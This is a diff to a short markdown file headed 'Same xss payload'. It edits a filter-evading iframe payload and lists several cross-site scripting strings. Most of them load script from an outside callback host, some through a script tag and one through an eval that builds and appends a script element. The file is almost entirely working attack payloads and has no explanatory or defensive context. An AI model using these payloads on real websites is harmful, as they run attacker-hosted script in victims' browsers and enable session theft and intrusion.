@@ -1,7 +1,7 @@
 # Same xss payload
 
 ```
-<iframe %00 src="&Tab;javascript:prompt(https://rrajasudhakar.xss.ht)&Tab;"%00>
+<iframe %00 src="&Tab;javascript:prompt(src=https://rrajasudhakar.xss.ht)&Tab;"%00>
 <script/&Tab; src='https://github.com' /&Tab;></script>
 "><script src=https://rrajasudhakar.xss.ht></script>
 javascript:eval('var a=document.createElement(\'script\');a.src=\'https://rrajasudhakar.xss.ht\';document.body.appendChild(a)')
